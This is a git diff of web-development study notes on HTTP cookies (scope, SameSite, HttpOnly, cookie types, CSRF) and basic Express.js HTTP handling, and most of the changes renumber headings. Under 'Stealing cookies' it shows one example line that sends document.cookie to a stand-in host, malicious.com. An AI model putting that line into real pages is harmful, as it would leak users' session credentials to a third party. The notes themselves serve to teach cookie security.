@@ -1,28 +1,31 @@
-[Cookies](#cookies)
-1. [HTTP Cookies Crash Course](https://youtu.be/sovAIX4doOE)
-    1. [Create Cookies](#create-cookies)
-    1. [Cookie Properties](#cookie-properties)
-        1. [Cookie Scope](#cookies-scope)
-            1. [Domain](#domain)
-            1. [Path](#path)
-        1. [Same Site](#same-site)
-    1. [Cookie Types](#cookie-types)
-        1. [Session cookie](#session-cookie)
-        1. [Permanent cookie](#permanent-cookie)
-        1. [Httponly cookie](#httponly-cookie)
-        1. [Secure cookie](#secure-cookie)
-        1. [Third party cookie](#third-party-cookie)
-        1. [Zombie cookie](#zombie-cookie)
-    1. [Cookie Security](#cookie-security)
-        1. [Stealing cookies](#stealing-cookies)
-        1. [Cross site request forgery](#cross-site-request-forgery)
+- [1. Cookies](#1-cookies)
+  - [1.1. Create Cookies](#11-create-cookies)
+  - [1.2. Cookie Properties](#12-cookie-properties)
+    - [1.2.1. Cookies Scope](#121-cookies-scope)
+      - [1.2.1.1. Domain](#1211-domain)
+      - [1.2.1.2. Path](#1212-path)
+    - [1.2.2. Expires, Max-age](#122-expires-max-age)
+    - [1.2.3. Same site](#123-same-site)
+  - [1.3. Cookie Types](#13-cookie-types)
+    - [1.3.1. Session cookie](#131-session-cookie)
+    - [1.3.2. Permanent cookie](#132-permanent-cookie)
+    - [1.3.3. Httponly cookie](#133-httponly-cookie)
+    - [1.3.4. Secure cookie](#134-secure-cookie)
+    - [1.3.5. Third party cookie](#135-third-party-cookie)
+    - [1.3.6. Zombie cookie](#136-zombie-cookie)
+  - [1.4. Cookie Security](#14-cookie-security)
+    - [1.4.1. Stealing cookies](#141-stealing-cookies)
+    - [1.4.2. Cross site request forgery](#142-cross-site-request-forgery)
+- [2. HTTP](#2-http)
+    - [2.0.1. Use Node.js express framework](#201-use-nodejs-express-framework)
+    - [2.0.2. Check attached body data of the request](#202-check-attached-body-data-of-the-request)
+    - [2.0.3. Authentication](#203-authentication)
+    - [2.0.4. Use express to create a static HTML website](#204-use-express-to-create-a-static-html-website)
 
-[HTTP](#http)
-1. [HTTP Crash Course & Exploration](https://youtu.be/iYM2zFP3Zn0)
 ---
-# Cookies
+# 1. Cookies
 - Reference [HTTP Cookies Crash Course](https://youtu.be/sovAIX4doOE)
-## Create Cookies
+## 1.1. Create Cookies
 1. Cookies can be set either on server or client side.
     1. Client - JavaScript `document.cookie`
         ```js
@@ -65,16 +68,16 @@
 1. When setting cookies from server-side, we can check in the developer console
     <img src="./images/cookies_setCookiesFromServer.png">
 
-## Cookie Properties
+## 1.2. Cookie Properties
 1. Cookies are sent with every request.
     1. We can check the details in "Cookie" > "request" > "Network" in developer console.
         <img src="./images/cookies_requestWithAllCookies.png">
     1. We if clear the cookies of a domain bucket, no "Cookie" property will be in the header when sending requests.
 
-### Cookies Scope
+### 1.2.1. Cookies Scope
 1. Cookies can be scoped by [`Domain`](#domain) and [`Path`](#path).
 
-#### Domain
+#### 1.2.1.1. Domain
 1. We can check `Cookies` in `Application` in developer console that cookies are stored in a "bucket" which is scoped by "domain".
 1. In addition, we can set "path" for cookies optionally, so we can send certain cookies when sending request to a specific route.
 1. When we change the domain, even a sub-domain from the same host or main domain, the cookies won't be shared.
@@ -85,7 +88,7 @@
     // both example.com and www.example.com can access foo=bar
     ```
 
-#### Path
+#### 1.2.1.2. Path
 1. Besides `domain`, we can set another property `path` when creating cookies.
     ```js
     // server JS
@@ -105,7 +108,7 @@
 1. When we visit different path, we can only get path only cookies and universal cookie for the domain.
 1. By grouping cookies with `domain` and `path`, we can increase security, reduce bandwith when transferring data, and limit data leakage.
 
-### Expires, Max-age
+### 1.2.2. Expires, Max-age
 1. A cookie will be destroied when the browser is closed if it's session-based and no `max-age` is given.
 1. We can give `max-age` as the property when creating a cookie. This property takes values as seconds. For example, if we'd like the cookie set alive for 1 min, we can give `max-age=60`.
 1. The cookie will be removed from the bucket automatically when it's expired.
@@ -114,7 +117,7 @@
     document.cookie = "tempcookie=9; max-age=60"; // this cookie alives only 1 min
     ```
 
-### Same site
+### 1.2.3. Same site
 1. As user credentials can be stored in cookies for authentication, cross site request forgery can be made if there's no limitation on cross site request sharing. 
 1. This forgery request can be done as all cookies will be sent along with the requests that the browser make.
 1. This is the main reason why it's recommended to regular users that DO NOT click suspicious links. This can allow external users access credentials cookies and forge user requests.
@@ -129,15 +132,15 @@
     ```
 1. Note that the default value for `samesite` is `lax` which will send the cookie when along all the requests to the domain or path.
 
-## Cookie Types
-### Session cookie
+## 1.3. Cookie Types
+### 1.3.1. Session cookie
 1. Session cookies alive with the user session. When the browser is closed or the user session expires, the cookie will expire and be removed.
 1. This is the default property which in mostly in the examples above.
 
-### Permanent cookie
+### 1.3.2. Permanent cookie
 1. This keeps cookies alive that doesn't have `max-age` or won't expire.
 
-### Httponly cookie
+### 1.3.3. Httponly cookie
 1. This type of cookies can only be served by server and the client CAN NOT read the cookie.
     ```js
     // server JS
@@ -149,19 +152,19 @@
 1. If we call `document.cookie` in the browser console, the `httponly` cookie won't be read and retrieved. This simply prevents JavaScript to access the cookie.
 1. Note that though this cookie can't be parsed by JavaScript, it is still a cookie and will be sent along with requests.
 
-### Secure cookie
+### 1.3.4. Secure cookie
 1. Secure cookies are only available if the website uses SSL with HTTPS.
 
-### Third party cookie
+### 1.3.5. Third party cookie
 1. This is having cookies provided by a 3rd party send along with requests.
 1. This is useful for marketing and advertising services. For example, Google may provide ads on a website and provides commission to the website owner.
 1. Note that cookies consider domains with different ports as the same domain (though origin is different). However, alias such as `localhost` with `127.0.0.1` will be treated as different domain.
 
-### Zombie cookie
+### 1.3.6. Zombie cookie
 1. Zombie cookies will respawn themselves with the same values though being removed. 
 
-## Cookie Security
-### Stealing cookies
+## 1.4. Cookie Security
+### 1.4.1. Stealing cookies
 1. If a cookie isn't assigned with `samesite` property, it can be fetched and manipulated by JavaScript. 
 1. For example, we can use JavaScript to change the `href` link of a hyper link and send the cookies to other servers.
 1. The following code will send all the cookies to an external link as GET requset in `cookies` parameter.
@@ -174,12 +177,12 @@
     stealBtn.href = `http://malicious.com/steal?cookies=${document.cookie}`;
     ```
 
-### Cross site request forgery
+### 1.4.2. Cross site request forgery
 1. This condition is explained in [Same Site](#same-site) that a malicious website can create a link and pretend the user to make requests with unsecured cookies. 
 1. If the service application doesn't have enough security, it may take the forgery request as a valid user request. 
 
 
-# HTTP
+# 2. HTTP
 - Reference 
     1. [HTTP Crash Course & Exploration](https://youtu.be/iYM2zFP3Zn0)
 1. What is HTTP?
@@ -233,7 +236,7 @@
 1. When visiting a website, we can check the connection between server and browser (client). We can open developer console (such as in Chrome browser) and check "**network**" tab for the different types of data and files that use browser to "**request**" to the server. Besides, we can check the header fields by clicking a document returned from the server. 
 1. In addition, we can use POSTMAN to send different types of HTTP request. We can use the check the `body` content, `preview` as if the data is HTML or other types of media such as image. Besides, we can also configure and send other metadata such as `parameters`, `authorization`, `headers`, and `body`.
 
-### Use Node.js express framework 
+### 2.0.1. Use Node.js express framework 
 1. We can set up a local server with by using Node.js with `express` framework. In the argument of a route handler, we can check meta-data of the header in `req.header`, 
     ```js
     const express = require('express');
@@ -255,7 +258,7 @@
     ```
 1. We can give different name of the property to check in the request header. For example, `user-agent` which is the browser or the program we use to send HTTP GET request to the endpoint. Besides, we can use `req.rawHeader` to send the whole header object, which is an `Array` of the field name in the header. 
 
-### Check attached body data of the request 
+### 2.0.2. Check attached body data of the request 
 1. In `express` server, we can set an endpoint and use `res.send()` to render the body of the request send from a client. For example, if a client sends data attched with the request, server can check the data from `req.body`. However, under `express` framework, we should use both `app.use(express.json())` and `app.use(express.urlencoded({ extended: false }))` middleware to read the data. 
 1. In this example, we create an endpoint `/contact` to receive `POST` request from users as with the data sending from client to server. 
     ```js 
@@ -285,7 +288,7 @@
     });
     ```
 
-### Authentication
+### 2.0.3. Authentication
 1. When we build a fullstack program, we can use JSON token for authentication. For example, we can send the token in `xAuth` token. 
     ```js 
     app.post('/login', (req, res) => {
@@ -323,7 +326,7 @@
     ```
     <img src="./images/JSONDeleteReq.PNG">
 
-### Use express to create a static HTML website
+### 2.0.4. Use express to create a static HTML website
 1. With `app.use(express.static('public'))`, we can create `public` folder in the root directory and creates a static HTML file `index.js`. Therefore, users use GET request to access the root directory will get teh HTML file returend. Besides, we can put other JavaScript script code and CSS file in the `public` folder and imported to use in the HTML file. 
     ```js 
     const express = require('express');
